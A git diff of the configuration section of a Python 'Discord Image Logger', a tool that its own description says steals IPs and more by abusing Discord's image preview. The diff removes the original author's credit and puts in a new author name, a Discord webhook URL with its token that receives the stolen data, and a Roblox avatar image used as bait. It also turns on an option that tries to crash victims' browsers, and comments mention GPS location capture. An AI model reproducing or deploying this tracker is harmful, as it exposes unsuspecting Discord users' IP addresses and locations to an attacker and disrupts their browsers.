@@ -1,19 +1,16 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
-from http.server import BaseHTTPRequestHandler
+ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__version__ = "v1.0"
+__author__ = "3c18x"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1437122656024658042/FDGVUFT_B9Cjjcxgb4oPWI5xLr-kj6gTbmPv-xAsJaAtIpwQRniy54xfbgIJh_A_u2xF",
+    "image": "https://images-ext-1.discordapp.net/external/UxFqEZ_9TIvPMniqUqWWRzO7UB9AgMFYNJeFC8Bde0E/https/tr.rbxcdn.com/30DAY-Avatar-3A3F0E1D63D4B20D1154019F2298E092-Png/352/352/Avatar/Png/noFilter?format=webp&width=315&height=315", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,13 +19,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by 3c18x's Image Logger. Discord: 5c18x", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
